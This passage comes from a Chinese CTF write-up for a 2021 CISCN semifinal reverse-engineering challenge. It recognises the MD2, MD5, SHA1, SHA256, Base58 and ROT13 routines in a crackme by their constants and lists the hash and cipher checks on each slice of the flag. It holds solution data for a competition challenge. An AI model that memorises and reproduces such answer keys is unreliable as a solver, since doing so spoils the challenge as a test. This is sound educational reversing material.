class="number">0xB2</span>, <span class="number">0x07</span>, <span class="number">0x3F</span>,</span><br><span class="line">    <span class="number">0x94</span>, <span class="number">0xC2</span>, <span class="number">0x10</span>, <span class="number">0x89</span>, <span class="number">0x0B</span>, <span class="number">0x22</span>, <span class="number">0x5F</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x7F</span>, <span class="number">0x5D</span>, <span class="number">0x9A</span>, <span class="number">0x5A</span>, <span class="number">0x90</span>, <span class="number">0x32</span>, <span class="number">0x27</span>,</span><br><span class="line">    <span class="number">0x35</span>, <span class="number">0x3E</span>, <span class="number">0xCC</span>, <span class="number">0xE7</span>, <span class="number">0xBF</span>, <span class="number">0xF7</span>, <span class="number">0x97</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0xFF</span>, <span class="number">0x19</span>, <span class="number">0x30</span>, <span class="number">0xB3</span>, <span class="number">0x48</span>, <span class="number">0xA5</span>, <span class="number">0xB5</span>, <span class="number">0xD1</span>,</span><br><span class="line">    <span class="number">0xD7</span>, <span class="number">0x5E</span>, <span class="number">0x92</span>, <span class="number">0x2A</span>, <span class="number">0xAC</span>, <span class="number">0x56</span>, <span class="number">0xAA</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0xB8</span>, <span class="number">0x38</span>, <span class="number">0xD2</span>, <span class="number">0x96</span>, <span class="number">0xA4</span>, <span class="number">0x7D</span>, <span class="number">0xB6</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0xFC</span>, <span class="number">0x6B</span>, <span class="number">0xE2</span>, <span class="number">0x9C</span>, <span class="number">0x74</span>, <span class="number">0x04</span>, <span class="number">0xF1</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0x9D</span>, <span class="number">0x70</span>, <span class="number">0x59</span>, <span class="number">0x64</span>, <span class="number">0x71</span>, <span class="number">0x87</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0x5B</span>, <span class="number">0xCF</span>, <span class="number">0x65</span>, <span class="number">0xE6</span>, <span class="number">0x2D</span>, <span class="number">0xA8</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x1B</span>, <span class="number">0x60</span>, <span class="number">0x25</span>, <span class="number">0xAD</span>, <span class="number">0xAE</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xF6</span>,</span><br><span class="line">    <span class="number">0x1C</span>, <span class="number">0x46</span>, <span class="number">0x61</span>, <span class="number">0x69</span>, <span class="number">0x34</span>, <span class="number">0x40</span>, <span class="number">0x7E</span>, <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x47</span>, <span class="number">0xA3</span>, <span class="number">0x23</span>, <span class="number">0xDD</span>, <span class="number">0x51</span>, <span class="number">0xAF</span>, <span class="number">0x3A</span>,</span><br><span class="line">    <span class="number">0xC3</span>, <span class="number">0x5C</span>, <span class="number">0xF9</span>, <span class="number">0xCE</span>, <span class="number">0xBA</span>, <span class="number">0xC5</span>, <span class="number">0xEA</span>, <span class="number">0x26</span>,</span><br><span class="line">    <span class="number">0x2C</span>, <span class="number">0x53</span>, <span class="number">0x0D</span>, <span class="number">0x6E</span>, <span class="number">0x85</span>, <span class="number">0x28</span>, <span class="number">0x84</span>, <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">0xD3</span>, <span class="number">0xDF</span>, <span class="number">0xCD</span>, <span class="number">0xF4</span>, <span class="number">0x41</span>, <span class="number">0x81</span>, <span class="number">0x4D</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x6A</span>, <span class="number">0xDC</span>, <span class="number">0x37</span>, <span class="number">0xC8</span>, <span class="number">0x6C</span>, <span class="number">0xC1</span>, <span class="number">0xAB</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0xE1</span>, <span class="number">0x7B</span>, <span class="number">0x08</span>, <span class="number">0x0C</span>, <span class="number">0xBD</span>, <span class="number">0xB1</span>, <span class="number">0x4A</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x88</span>, <span class="number">0x95</span>, <span class="number">0x8B</span>, <span class="number">0xE3</span>, <span class="number">0x63</span>, <span class="number">0xE8</span>, <span class="number">0x6D</span>,</span><br><span class="line">    <span class="number">0xE9</span>, <span class="number">0xCB</span>, <span class="number">0xD5</span>, <span class="number">0xFE</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x1D</span>, <span class="number">0x39</span>,</span><br><span class="line">    <span class="number">0xF2</span>, <span class="number">0xEF</span>, <span class="number">0xB7</span>, <span class="number">0x0E</span>, <span class="number">0x66</span>, <span class="number">0x58</span>, <span class="number">0xD0</span>, <span class="number">0xE4</span>,</span><br><span class="line">    <span class="number">0xA6</span>, <span class="number">0x77</span>, <span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x75</span>, <span class="number">0x4B</span>, <span class="number">0x0A</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0xB4</span>, <span class="number">0x8F</span>, <span class="number">0xED</span>, <span class="number">0x1F</span>, <span class="number">0x1A</span>,</span><br><span class="line">    <span class="number">0xDB</span>, <span class="number">0x99</span>, <span class="number">0x8D</span>, <span class="number">0x33</span>, <span class="number">0x9F</span>, <span class="number">0x11</span>, <span class="number">0x83</span>, <span class="number">0x14</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_401880(0x94u, 0x68u, (__int64)&amp;v9[4])</span></span><br><span class="line">MD2(STRING[<span class="number">62</span>:<span class="number">66</span>])==[<span class="number">0xC6</span>, <span class="number">0x56</span>, <span class="number">0xA6</span>, <span class="number">0xEA</span>, <span class="number">0xD7</span>, <span class="number">0x37</span>, <span class="number">0x24</span>, <span class="number">0x03</span>, <span class="number">0x0B</span>, <span class="number">0x2D</span>, <span class="number">0x0B</span>, <span class="number">0xEC</span>, <span class="number">0x8A</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0xDD</span>]</span><br></pre></td></tr></table></figure><h3 id="哈希-MD5"><a href="#哈希-MD5" class="headerlink" title="[哈希] MD5"></a>[哈希] MD5</h3><blockquote><p>具体实现：<a href="https://blog.csdn.net/xhhjin/article/details/8450686">C语言实现md5函数代码_xhhjin的专栏-CSDN博客_c语言md5</a></p><p>在本题中对应<code>sub_401880()</code>里的<code>case 0x9Du</code></p></blockquote><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210712102244880.png"></p><p>在<code>sub_4015D0 -&gt; sub_415400()</code>里有很熟悉的MD5块初始化：</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210712102339729.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_415400</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">64</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">72</span>) = <span class="number">0L</span>L;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">80</span>) = <span class="number">0x67452301</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">84</span>) = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">88</span>) = <span class="number">0x98BADCFE</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">92</span>) = <span class="number">0x10325476</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（有时候MD5的这个常量也值得注意↓，来自<a href="https://github.com/pod32g/MD5/blob/master/md5.c">MD5&#x2F;md5.c at master · pod32g&#x2F;MD5</a>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">uint32_t</span> k[<span class="number">64</span>] = &#123;</span><br><span class="line"><span class="number">0xd76aa478</span>, <span class="number">0xe8c7b756</span>, <span class="number">0x242070db</span>, <span class="number">0xc1bdceee</span> ,</span><br><span class="line"><span class="number">0xf57c0faf</span>, <span class="number">0x4787c62a</span>, <span class="number">0xa8304613</span>, <span class="number">0xfd469501</span> ,</span><br><span class="line"><span class="number">0x698098d8</span>, <span class="number">0x8b44f7af</span>, <span class="number">0xffff5bb1</span>, <span class="number">0x895cd7be</span> ,</span><br><span class="line"><span class="number">0x6b901122</span>, <span class="number">0xfd987193</span>, <span class="number">0xa679438e</span>, <span class="number">0x49b40821</span> ,</span><br><span class="line"><span class="number">0xf61e2562</span>, <span class="number">0xc040b340</span>, <span class="number">0x265e5a51</span>, <span class="number">0xe9b6c7aa</span> ,</span><br><span class="line"><span class="number">0xd62f105d</span>, <span class="number">0x02441453</span>, <span class="number">0xd8a1e681</span>, <span class="number">0xe7d3fbc8</span> ,</span><br><span class="line"><span class="number">0x21e1cde6</span>, <span class="number">0xc33707d6</span>, <span class="number">0xf4d50d87</span>, <span class="number">0x455a14ed</span> ,</span><br><span class="line"><span class="number">0xa9e3e905</span>, <span class="number">0xfcefa3f8</span>, <span class="number">0x676f02d9</span>, <span class="number">0x8d2a4c8a</span> ,</span><br><span class="line"><span class="number">0xfffa3942</span>, <span class="number">0x8771f681</span>, <span class="number">0x6d9d6122</span>, <span class="number">0xfde5380c</span> ,</span><br><span class="line"><span class="number">0xa4beea44</span>, <span class="number">0x4bdecfa9</span>, <span class="number">0xf6bb4b60</span>, <span class="number">0xbebfbc70</span> ,</span><br><span class="line"><span class="number">0x289b7ec6</span>, <span class="number">0xeaa127fa</span>, <span class="number">0xd4ef3085</span>, <span class="number">0x04881d05</span> ,</span><br><span class="line"><span class="number">0xd9d4d039</span>, <span class="number">0xe6db99e5</span>, <span class="number">0x1fa27cf8</span>, <span class="number">0xc4ac5665</span> ,</span><br><span class="line"><span class="number">0xf4292244</span>, <span class="number">0x432aff97</span>, <span class="number">0xab9423a7</span>, <span class="number">0xfc93a039</span> ,</span><br><span class="line"><span class="number">0x655b59c3</span>, <span class="number">0x8f0ccc92</span>, <span class="number">0xffeff47d</span>, <span class="number">0x85845dd1</span> ,</span><br><span class="line"><span class="number">0x6fa87e4f</span>, <span class="number">0xfe2ce6e0</span>, <span class="number">0xa3014314</span>, <span class="number">0x4e0811a1</span> ,</span><br><span class="line"><span class="number">0xf7537e82</span>, <span class="number">0xbd3af235</span>, <span class="number">0x2ad7d2bb</span>, <span class="number">0xeb86d391</span> &#125;;</span><br></pre></td></tr></table></figure><p>本题有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_401880(0x9Du, 0x9Fu, (__int64)v11)</span></span><br><span class="line">MD5(STRING[<span class="number">74</span>:])==[<span class="number">0x2D</span>, <span class="number">0x4C</span>, <span class="number">0x4C</span>, <span class="number">0xAF</span>, <span class="number">0xB8</span>, <span class="number">0xE6</span>, <span class="number">0x64</span>, <span class="number">0xC0</span>, <span class="number">0x05</span>, <span class="number">0x56</span>, <span class="number">0xB0</span>, <span class="number">0x28</span>, <span class="number">0x06</span>, <span class="number">0xAB</span>, <span class="number">0x7E</span>, <span class="number">0x10</span>]</span><br></pre></td></tr></table></figure><h3 id="哈希-SHA1"><a href="#哈希-SHA1" class="headerlink" title="[哈希] SHA1"></a>[哈希] SHA1</h3><blockquote><p>具体实现：<a href="https://github.com/vog/sha1/blob/master/sha1.hpp">sha1&#x2F;sha1.hpp at master · vog&#x2F;sha1</a></p><p>在本题中对应<code>sub_401880()</code>里的<code>case 0xB4u</code></p></blockquote><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711221506776.png"></p><p>可以看到<code>sub_401480() -&gt; sub_4162B0()</code>有<code>sha1</code>的常数相关：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_4162B0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">64</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">72</span>) = <span class="number">0L</span>L;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">80</span>) = <span class="number">0x67452301</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">84</span>) = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">88</span>) = <span class="number">0x98BADCFE</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">92</span>) = <span class="number">0x10325476</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">96</span>) = <span class="number">0xC3D2E1F0</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">100</span>) = <span class="number">0x5A827999</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">104</span>) = <span class="number">0x6ED9EBA1</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">108</span>) = <span class="number">0x8F1BBCDC</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">112</span>) = <span class="number">0xCA62C1D6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_401880(0xB4u, 0x8Cu, (__int64)&amp;v8)</span></span><br><span class="line">SHA1(STRING[<span class="number">48</span>:<span class="number">52</span>])==[<span class="number">0x65</span>, <span class="number">0xBC</span>, <span class="number">0xA7</span>, <span class="number">0xCC</span>, <span class="number">0x3A</span>, <span class="number">0x77</span>, <span class="number">0x1F</span>, <span class="number">0xFC</span>, <span class="number">0x55</span>, <span class="number">0xFE</span>, <span class="number">0x3A</span>, <span class="number">0xA3</span>, <span class="number">0x2A</span>, <span class="number">0xB4</span>, <span class="number">0x9C</span>, <span class="number">0x4B</span>, <span class="number">0xCA</span>, <span class="number">0xE3</span>, <span class="number">0x84</span>, <span class="number">0x91</span>]</span><br></pre></td></tr></table></figure><h3 id="哈希-SHA256"><a href="#哈希-SHA256" class="headerlink" title="[哈希] SHA256"></a>[哈希] SHA256</h3><blockquote><p>具体实现：<a href="https://github.com/ilvn/SHA256/blob/main/sha256.c">SHA256&#x2F;sha256.c at main · ilvn&#x2F;SHA256</a></p><p>在本题中对应<code>sub_401880()</code>里的<code>case 0x72u</code></p></blockquote><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210712103055109.png"></p><p>在<code>sub_401520() -&gt; sub_417110()</code>里有SHA256块的初始化：</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210712105841015.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sha256_init</span><span class="params">(sha256_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ctx-&gt;len[<span class="number">0</span>] = ctx-&gt;len[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ctx-&gt;hash[<span class="number">0</span>] = <span class="number">0x6a09e667</span>; ctx-&gt;hash[<span class="number">1</span>] = <span class="number">0xbb67ae85</span>;</span><br><span class="line">    ctx-&gt;hash[<span class="number">2</span>] = <span class="number">0x3c6ef372</span>; ctx-&gt;hash[<span class="number">3</span>] = <span class="number">0xa54ff53a</span>;</span><br><span class="line">    ctx-&gt;hash[<span class="number">4</span>] = <span class="number">0x510e527f</span>; ctx-&gt;hash[<span class="number">5</span>] = <span class="number">0x9b05688c</span>;</span><br><span class="line">    ctx-&gt;hash[<span class="number">6</span>] = <span class="number">0x1f83d9ab</span>; ctx-&gt;hash[<span class="number">7</span>] = <span class="number">0x5be0cd19</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">/* sha256_init */</span></span><br></pre></td></tr></table></figure><p>SHA256同样也有需要注意的常量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> K[<span class="number">64</span>] = &#123;</span><br><span class="line">     <span class="number">0x428a2f98</span>, <span class="number">0x71374491</span>, <span class="number">0xb5c0fbcf</span>, <span class="number">0xe9b5dba5</span>,</span><br><span class="line">     <span class="number">0x3956c25b</span>, <span class="number">0x59f111f1</span>, <span class="number">0x923f82a4</span>, <span class="number">0xab1c5ed5</span>,</span><br><span class="line">     <span class="number">0xd807aa98</span>, <span class="number">0x12835b01</span>, <span class="number">0x243185be</span>, <span class="number">0x550c7dc3</span>,</span><br><span class="line">     <span class="number">0x72be5d74</span>, <span class="number">0x80deb1fe</span>, <span class="number">0x9bdc06a7</span>, <span class="number">0xc19bf174</span>,</span><br><span class="line">     <span class="number">0xe49b69c1</span>, <span class="number">0xefbe4786</span>, <span class="number">0x0fc19dc6</span>, <span class="number">0x240ca1cc</span>,</span><br><span class="line">     <span class="number">0x2de92c6f</span>, <span class="number">0x4a7484aa</span>, <span class="number">0x5cb0a9dc</span>, <span class="number">0x76f988da</span>,</span><br><span class="line">     <span class="number">0x983e5152</span>, <span class="number">0xa831c66d</span>, <span class="number">0xb00327c8</span>, <span class="number">0xbf597fc7</span>,</span><br><span class="line">     <span class="number">0xc6e00bf3</span>, <span class="number">0xd5a79147</span>, <span class="number">0x06ca6351</span>, <span class="number">0x14292967</span>,</span><br><span class="line">     <span class="number">0x27b70a85</span>, <span class="number">0x2e1b2138</span>, <span class="number">0x4d2c6dfc</span>, <span class="number">0x53380d13</span>,</span><br><span class="line">     <span class="number">0x650a7354</span>, <span class="number">0x766a0abb</span>, <span class="number">0x81c2c92e</span>, <span class="number">0x92722c85</span>,</span><br><span class="line">     <span class="number">0xa2bfe8a1</span>, <span class="number">0xa81a664b</span>, <span class="number">0xc24b8b70</span>, <span class="number">0xc76c51a3</span>,</span><br><span class="line">     <span class="number">0xd192e819</span>, <span class="number">0xd6990624</span>, <span class="number">0xf40e3585</span>, <span class="number">0x106aa070</span>,</span><br><span class="line">     <span class="number">0x19a4c116</span>, <span class="number">0x1e376c08</span>, <span class="number">0x2748774c</span>, <span class="number">0x34b0bcb5</span>,</span><br><span class="line">     <span class="number">0x391c0cb3</span>, <span class="number">0x4ed8aa4a</span>, <span class="number">0x5b9cca4f</span>, <span class="number">0x682e6ff3</span>,</span><br><span class="line">     <span class="number">0x748f82ee</span>, <span class="number">0x78a5636f</span>, <span class="number">0x84c87814</span>, <span class="number">0x8cc70208</span>,</span><br><span class="line">     <span class="number">0x90befffa</span>, <span class="number">0xa4506ceb</span>, <span class="number">0xbef9a3f7</span>, <span class="number">0xc67178f2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>本题有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_401880(0x72u, 0xCu, (__int64)v9)</span></span><br><span class="line">SHA256(STRING[<span class="number">58</span>:<span class="number">62</span>])==[<span class="number">0x50</span>, <span class="number">0xC0</span>, <span class="number">0xCE</span>, <span class="number">0x77</span>, <span class="number">0xB9</span>, <span class="number">0xD0</span>, <span class="number">0x0D</span>, <span class="number">0x0F</span>, <span class="number">0x15</span>, <span class="number">0x9D</span>, <span class="number">0xC5</span>, <span class="number">0x63</span>, <span class="number">0x0F</span>, <span class="number">0x2D</span>, <span class="number">0xB4</span>, <span class="number">0x54</span>, <span class="number">0xC9</span>, <span class="number">0xC6</span>, <span class="number">0x43</span>, <span class="number">0x8F</span>, <span class="number">0xCD</span>, <span class="number">0x95</span>, <span class="number">0xF6</span>, <span class="number">0x3B</span>, <span class="number">0x73</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x6E</span>, <span class="number">0xA9</span>, <span class="number">0xF9</span>, <span class="number">0xAB</span>, <span class="number">0x40</span>]</span><br></pre></td></tr></table></figure><h3 id="古典密码-Base58"><a href="#古典密码-Base58" class="headerlink" title="[古典密码] Base58"></a>[古典密码] Base58</h3><blockquote><p>具体实现：</p><p>在本题中对应<code>sub_401880()</code>里的<code>case 0x08u</code></p></blockquote><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210712110831618.png"></p><p><code>sub_4014E0() -&gt; sub_4075F0()</code>里是一个很熟悉的base58编码，而且<code>byte_41D250</code>也是明显的Base58编码表：<code>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</code></p><p>所以有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_401880(8u, 0x4Fu, (__int64)&amp;v8 + 4)</span></span><br><span class="line">Base58(STRING[<span class="number">52</span>:<span class="number">58</span>])==[<span class="number">0x78</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x4E</span>, <span class="number">0x36</span>, <span class="number">0x55</span>]</span><br></pre></td></tr></table></figure><h3 id="古典密码-ROT13"><a href="#古典密码-ROT13" class="headerlink" title="[古典密码] ROT13"></a>[古典密码] ROT13</h3><blockquote><p>具体实现：<a href="https://www.cnblogs.com/ESHLkangi/p/9363075.html">ROT13 加密与解密 - ESHLkangi - 博客园</a></p><p>在本题中对应<code>sub_401880()</code>里的<code>case 0xF2u</code></p></blockquote><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210712110533529.png"></p><p><code>sub_401670() -&gt; sub_415890()</code>里就是一个很明显的ROT13位移（</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210712110634873.png"></p><p>所以有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_401880(0xF2u, 0xA9u, (__int64)&amp;v6)</span></span><br><span class="line">ROT13(STRING[<span class="number">8</span>:<span class="number">12</span>])==[<span class="number">0x76</span>, <span class="number">0x72</span>, <span class="number">0x68</span>, <span class="number">0x64</span>]</span><br></pre></td></tr></table></figure><h2 id="整理解密爆破得flag"><a href="#整理解密爆破得flag" class="headerlink" title="整理解密爆破得flag"></a>整理解密爆破得flag</h2><p>最后整理前面各密码算法的分析，并按照<code>STRING</code>分片顺序排序有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_401880(0xACu, 0xDDu, (__int64)v5)</span></span><br><span class="line">Blowfish(<span class="string">&quot;Decrypt!&quot;</span>,STRING[<span class="number">0</span>:<span class="number">8</span>])==[<span class="number">0x06</span>, <span class="number">0x8F</span>, <span class="number">0x5A</span>, <span class="number">0xFF</span>, <span class="number">0xCB</span>, <span class="number">0xD6</span>, <span class="number">0xE9</span>, <span class="number">0x0B</span>]</span><br><span class="line"><span class="comment"># sub_401880(0xF2u, 0xA9u, (__int64)&amp;v6)</span></span><br><span class="line">ROT13(STRING[<span class="number">8</span>:<span class="number">12</span>])==[<span class="number">0x76</span>, <span class="number">0x72</span>, <span class="number">0x68</span>, <span class="number">0x64</span>]</span><br><span class="line"><span class="comment"># sub_401880(0x91u, 0x20u, (__int64)&amp;v6 + 4)</span></span><br><span class="line">AES256(<span class="string">&#x27;!!Successfully!!&#x27;</span>,STRING[<span class="number">12</span>:<span class="number">44</span>])==[<span class="number">0xD1</span>, <span class="number">0x1F</span>, <span class="number">0xA5</span>, <span class="number">0x6A</span>, <span class="number">0xCE</span>, <span class="number">0x96</span>, <span class="number">0x26</span>, <span class="number">0x3A</span>, <span class="number">0x95</span>, <span class="number">0xD3</span>, <span class="number">0xFC</span>, <span class="number">0x60</span>, <span class="number">0xF7</span>, <span class="number">0x3D</span>, <span class="number">0x2D</span>, <span class="number">0xD2</span>]</span><br><span class="line"><span class="comment"># sub_401880(0x5Cu, 0x77u, (__int64)&amp;v7)</span></span><br><span class="line">RC4(STRING[<span class="number">44</span>:<span class="number">48</span>],<span class="string">&#x27;You have made a huge progress!&#x27;</span>)==[<span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0xCF</span>, <span class="number">0x22</span>, <span class="number">0x4C</span>, <span class="number">0xFD</span>, <span class="number">0x49</span>, <span class="number">0xC2</span>, <span class="number">0x73</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x99</span>, <span class="number">0xED</span>, <span class="number">0x71</span>, <span class="number">0x2D</span>, <span class="number">0xDD</span>, <span class="number">0x08</span>, <span class="number">0x58</span>, <span class="number">0x51</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x38</span>, <span class="number">0xD1</span>, <span class="number">0x59</span>, <span class="number">0x2C</span>, <span class="number">0x2F</span>, <span class="number">0xE4</span>, <span class="number">0x4A</span>, <span class="number">0x66</span>, <span class="number">0x0F</span>]</span><br><span class="line"><span class="comment"># sub_401880(0xB4u, 0x8Cu, (__int64)&amp;v8)</span></span><br><span class="line">SHA1(STRING[<span class="number">48</span>:<span class="number">52</span>])==[<span class="number">0x65</span>, <span class="number">0xBC</span>, <span class="number">0xA7</span>, <span class="number">0xCC</span>, <span class="number">0x3A</span>, <span class="number">0x77</span>, <span class="number">0x1F</span>, <span class="number">0xFC</span>, <span class="number">0x55</span>, <span class="number">0xFE</span>, <span class="number">0x3A</span>, <span class="number">0xA3</span>, <span class="number">0x2A</span>, <span class="number">0xB4</span>, <span class="number">0x9C</span>, <span class="number">0x4B</span>, <span class="number">0xCA</span>, <span class="number">0xE3</span>, <span class="number">0x84</span>, <span class="number">0x91</span>]</span><br><span class="line"><span class="comment"># sub_401880(8u, 0x4Fu, (__int64)&amp;v8 + 4)</span></span><br><span class="line">Base58(STRING[<span class="number">52</span>:<span class="number">58</span>])==[<span class="number">0x78</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x4E</span>, <span class="number">0x36</span>, <span class="number">0x55</span>]</span><br><span class="line"><span class="comment"># sub_401880(0x72u, 0xCu, (__int64)v9)</span></span><br><span class="line">SHA256(STRING[<span class="number">58</span>:<span class="number">62</span>])==[<span class="number">0x50</span>, <span class="number">0xC0</span>, <span class="number">0xCE</span>, <span class="number">0x77</span>, <span class="number">0xB9</span>, <span class="number">0xD0</span>, <span class="number">0x0D</span>, <span class="number">0x0F</span>, <span class="number">0x15</span>, <span class="number">0x9D</span>, <span class="number">0xC5</span>, <span class="number">0x63</span>, <span class="number">0x0F</span>, <span class="number">0x2D</span>, <span class="number">0xB4</span>, <span class="number">0x54</span>, <span class="number">0xC9</span>, <span class="number">0xC6</span>, <span class="number">0x43</span>, <span class="number">0x8F</span>, <span class="number">0xCD</span>, <span class="number">0x95</span>, <span class="number">0xF6</span>, <span class="number">0x3B</span>, <span class="number">0x73</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x6E</span>, <span class="number">0xA9</span>, <span class="number">0xF9</span>, <span class="number">0xAB</span>, <span class="number">0x40</span>]</span><br><span class="line"><span class="comment"># sub_401880(0x94u, 0x68u, (__int64)&amp;v9[4])</span></span><br><span class="line">MD2(STRING[<span class="number">62</span>:<span class="number">66</span>])==[<span class="number">0xC6</span>, <span class="number">0x56</span>, <span class="number">0xA6</span>, <span 